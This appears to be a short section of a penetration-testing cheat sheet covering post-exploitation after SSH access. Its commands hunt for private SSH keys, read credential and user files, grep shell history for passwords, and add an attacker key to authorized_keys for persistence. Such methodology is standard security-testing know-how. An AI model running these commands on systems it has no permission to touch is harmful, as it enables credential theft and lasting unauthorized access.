# Phase 8: Post-Exploitation

Activities after gaining SSH access:

```bash
# Check sudo privileges
sudo -l

# Find SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Check SSH directory
ls -la ~/.ssh/
cat ~/.ssh/known_hosts
cat ~/.ssh/authorized_keys

# Add persistence (add your key)
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

# Extract SSH configuration
cat /etc/ssh/sshd_config

# Find other users
cat /etc/passwd | grep -v nologin
ls /home/

# History for credentials
cat ~/.bash_history | grep -i ssh
cat ~/.bash_history | grep -i pass
```
